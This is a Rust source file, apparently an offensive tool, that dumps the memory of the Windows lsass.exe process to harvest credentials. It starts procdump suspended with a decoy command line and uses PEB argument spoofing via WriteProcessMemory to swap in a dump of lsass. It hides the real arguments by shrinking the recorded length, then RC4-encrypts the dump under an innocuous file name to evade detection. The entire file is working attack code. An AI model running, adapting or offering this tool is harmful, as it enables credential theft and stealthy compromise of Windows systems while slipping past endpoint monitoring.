use std::ffi::c_void;
use std::io::SeekFrom;
use std::ptr;
use std::time::Duration;

use rc4::{Rc4, KeyInit, StreamCipher};
use tokio::fs::File;
use dinvoke_rs::dinvoke;
use sysinfo::{System, SystemExt, ProcessExt};
use tokio::io::{AsyncSeekExt, AsyncReadExt, AsyncWriteExt};
use tokio::time::Interval;
use windows::Win32::Foundation::{BOOL, CloseHandle};
use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
use windows::Win32::System::Threading::{STARTUPINFOA, PROCESS_INFORMATION, CREATE_SUSPENDED, PROCESS_BASIC_INFORMATION, PEB, CREATE_NEW_CONSOLE, RTL_USER_PROCESS_PARAMETERS, ResumeThread};
use windows::Win32::System::Threading::CreateProcessA;
use windows::core::{PSTR, PCSTR, PWSTR};
use windows::Win32::Foundation::{HANDLE, NTSTATUS, UNICODE_STRING};

fn breakpoint() {
    println!("BP HIT");
    let mut buff: String = String::new();
    std::io::stdin().read_line(&mut buff).unwrap();
}

fn get_pid() -> String {
    let mut sys = System::new_all();
    sys.refresh_all();

    let mut pid = String::new();

    for (proc_id, process) in sys.processes() {
        if process.name().to_lowercase() == "lsass.exe" {
            pid =  proc_id.to_string();
            break;
        }
    }
    return pid;
}

#[tokio::main]
async fn main() {
    unsafe {
        let si: STARTUPINFOA = STARTUPINFOA::default();
        let mut pi: PROCESS_INFORMATION = PROCESS_INFORMATION::default();
        println!("[+] Creating process");

        let cmd_pstr: PSTR = PSTR::from_raw(String::from("C:\\SysinternalsSuite\\procdump64.exe -accepteula -w -e -dc testing notepad\0").as_mut_ptr());

        CreateProcessA(
            PCSTR::null(),
            cmd_pstr,
            Some(ptr::null_mut()),
            Some(ptr::null_mut()),
            BOOL(0),
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            Some(ptr::null_mut()),
            PCSTR::null(),
            &si,
            &mut pi
        ).unwrap();

        let ret: Option<NTSTATUS>;

        let mut pbi: PROCESS_BASIC_INFORMATION = PROCESS_BASIC_INFORMATION::default();
        let mut ret_len: u32 = 0;

        let ntdll: isize = dinvoke::get_module_base_address("ntdll.dll");
        println!("[+] Querying process information");

        let ptr_nt_query_information_process: unsafe fn (HANDLE, u32, *mut PROCESS_BASIC_INFORMATION, u32, *mut u32) -> NTSTATUS;

        dinvoke::dynamic_invoke!(ntdll, "NtQueryInformationProcess", ptr_nt_query_information_process, ret, pi.hProcess, 0, &mut pbi, std::mem::size_of_val(&pbi) as u32, &mut ret_len);

        let status: u32 = std::mem::transmute(ret.unwrap());

        if status != 0 {
            println!("[!] Error querying process information");
        }

        let peb: PEB = PEB::default();
        let mut out_bytes: usize = 0;

        let peb_c_void: *mut c_void = std::mem::transmute::<&PEB, *mut c_void>(&peb);

        println!("[+] Reading process memory for PEB");

        ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress as *mut c_void, peb_c_void, std::mem::size_of::<PEB>(), Some(&mut out_bytes)).unwrap();

        let user_proc_param: RTL_USER_PROCESS_PARAMETERS = RTL_USER_PROCESS_PARAMETERS::default();
        let user_proc_param_c_void: *mut c_void = std::mem::transmute::<&RTL_USER_PROCESS_PARAMETERS, *mut c_void>(&user_proc_param);

        let addr_proc_param: *mut c_void = std::mem::transmute::<*mut RTL_USER_PROCESS_PARAMETERS, *mut c_void>(peb.ProcessParameters);

        println!("[+] Reading process memory for arguments");
        ReadProcessMemory(pi.hProcess, addr_proc_param, user_proc_param_c_void, std::mem::size_of::<RTL_USER_PROCESS_PARAMETERS>(), Some(&mut out_bytes)).unwrap();

        println!("Process parameters: {:?}", user_proc_param.CommandLine.Buffer);

        breakpoint();
        
        let p_proc_param: *mut RTL_USER_PROCESS_PARAMETERS = user_proc_param_c_void as *mut RTL_USER_PROCESS_PARAMETERS;

        let org_arg_len: u16 = (*p_proc_param).CommandLine.Length;

        println!("[+] Patching arguments");
        let pid: String = get_pid();
        let args: String = format!("C:\\SysinternalsSuite\\procdump64.exe -accepteula -ma {pid} -o test.dmp\0");
        let mut args_u16: Vec<u16> = args.encode_utf16().collect();

        while ( args_u16.len() as u16 * std::mem::size_of::<u16>() as u16 ) < org_arg_len {
            args_u16.push(0);
        }

        let arg_len: usize = args_u16.len() * std::mem::size_of::<u16>();

        let c_buff: *mut c_void = std::mem::transmute::<PWSTR, *mut c_void>((*p_proc_param).CommandLine.Buffer);
        println!("Original arg length: {org_arg_len}");
        println!("New arg length: {arg_len}");

        WriteProcessMemory(pi.hProcess, c_buff, args_u16.as_mut_ptr() as *mut c_void, arg_len, Some(&mut out_bytes)).unwrap();
        println!("Bytes written: {} at {:?}", out_bytes, c_buff);

        breakpoint();
        
        println!("[+] Hiding arguments");
        
        let field_pointer: *const UNICODE_STRING = &(*p_proc_param).CommandLine as *const UNICODE_STRING;
        let len_offest: usize = field_pointer as usize - p_proc_param as usize;
        
        let param_len_buffer: usize =  ( peb.ProcessParameters as usize ) + len_offest;

        println!("Address of Length field: {:?}", param_len_buffer as *mut c_void);

        let new_length: u16 = "C:\\SysinternalsSuite\\procdump64.exe".len() as u16 * std::mem::size_of::<u16>() as u16;
        let mut new_length_data: Vec<u16> = vec![new_length, 0];
        println!("new length: {new_length}");

        WriteProcessMemory(pi.hProcess, param_len_buffer as *mut c_void, new_length_data.as_mut_ptr() as *mut c_void, std::mem::size_of::<u16>(), Some(&mut out_bytes)).unwrap();

        breakpoint();

        ResumeThread(pi.hThread);

        CloseHandle(pi.hProcess).unwrap();
        CloseHandle(pi.hThread).unwrap();

        println!("[+] Waiting for file");
        while std::fs::File::open("C:\\Users\\Dylan Reuter\\Desktop\\test.dmp").is_err() {
            continue;
        }

        let mut file: File = File::open("C:\\Users\\Dylan Reuter\\Desktop\\test.dmp").await.unwrap();
        let mut interval: Interval = tokio::time::interval(Duration::from_millis(500));
        let mut contents: Vec<u8> = vec![];
        let mut position: usize = 0;

        let mut count: i32 = 0;
        while count < 120 {
            if count % 5 == 0 {
                println!("count {} - file bytes copied: {}", count, contents.len());
            }
            file.seek(SeekFrom::Start(position as u64)).await.unwrap();
            position += file.read_to_end(&mut contents).await.unwrap();

            interval.tick().await;
            count +=1;
        }

        println!("[+] Encrypting file");
        let mut rc4 = Rc4::new(b"secretkey".into());
        rc4.apply_keystream(&mut contents);

        let mut encrypted_file: File = File::create("C:\\Users\\Dylan Reuter\\Desktop\\normal_file.dmp").await.unwrap();
        encrypted_file.write_all(&contents).await.unwrap();
        println!("[+] File saved to: C:\\Users\\Dylan Reuter\\Desktop\\normal_file.dmp");

    }
}
